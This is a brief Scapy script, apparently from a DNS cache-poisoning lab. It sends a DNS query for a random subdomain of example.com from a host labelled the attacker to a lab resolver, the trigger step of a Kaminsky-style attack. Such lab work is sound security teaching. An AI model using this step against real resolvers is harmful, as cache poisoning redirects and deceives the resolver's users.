from scapy.all import * 
import random, string

def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))

attackerIP = "10.9.0.1"
apolloIP = "10.9.0.53"

Qdsec = DNSQR(qname=randomword(5) + '.example.com')
dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0,arcount=0, qd=Qdsec)

ip = IP(dst=apolloIP, src=attackerIP)
udp = UDP(dport=53, sport=RandShort(), chksum=0)
request = ip/udp/dns

send(request) 